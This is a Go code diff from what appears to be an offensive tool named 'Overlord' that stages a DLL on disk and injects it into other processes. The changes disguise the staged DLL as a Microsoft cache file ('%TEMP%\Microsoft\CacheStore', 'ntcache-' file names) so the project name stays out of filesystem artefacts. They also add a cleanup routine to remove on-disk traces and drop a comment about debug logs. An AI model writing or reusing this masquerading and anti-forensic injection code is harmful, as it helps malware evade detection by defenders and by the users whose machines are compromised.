@@ -1362,8 +1362,6 @@ func buildEnvironmentBlock(searchPath, replacePath, shmName string, dllSize int)
 		"RDI_SEARCH_PATH=" + searchPath,
 		"RDI_REPLACE_PATH=" + replacePath,
 	}
-	// Enable hook-side file logging; the oblivious DLL writes per-process trace
-	// logs to %TEMP%\Overlord\backstage\BackstageInjection-debug-<pid>.log.
 	if overlordenv.Enabled && overlordenv.Getenv("BACKSTAGE_DEBUG_LOG") != "0" {
 		extra = append(extra, "BackstageInjectionDebug=1")
 	}
@@ -1488,17 +1486,28 @@ func injectIntoProcess(hProcess uintptr, dllBytes []byte, method InjectionMethod
 	}
 }
 
+func stagingDir() string {
+	// Neutral path: %TEMP%\Microsoft\CacheStore — avoids project name in filesystem artefacts.
+	return filepath.Join(os.TempDir(), "Microsoft", "CacheStore")
+}
+
+// CleanupStagingDir removes the staging directory and all cached DLL files.
+// Call on agent teardown / uninstall to leave no on-disk artefacts.
+func CleanupStagingDir() {
+	_ = os.RemoveAll(stagingDir())
+}
+
 // stageInjectionDLL writes the DLL bytes to a temp file so it can be loaded
 // with LoadLibraryW. The file name is content-addressed so repeat injections
 // reuse an existing file.
 func stageInjectionDLL(dllBytes []byte) (string, error) {
 	sum := sha256.Sum256(dllBytes)
 	hash := hex.EncodeToString(sum[:])
-	dir := filepath.Join(os.TempDir(), "Overlord", "backstage")
+	dir := stagingDir()
 	if err := os.MkdirAll(dir, 0700); err != nil {
 		return "", fmt.Errorf("create staging dir: %w", err)
 	}
-	target := filepath.Join(dir, "BackstageInjection-"+hash+".x64.dll")
+	target := filepath.Join(dir, "ntcache-"+hash+".x64.dll")
 	if st, err := os.Stat(target); err == nil && st.Size() == int64(len(dllBytes)) {
 		return target, nil
 	}
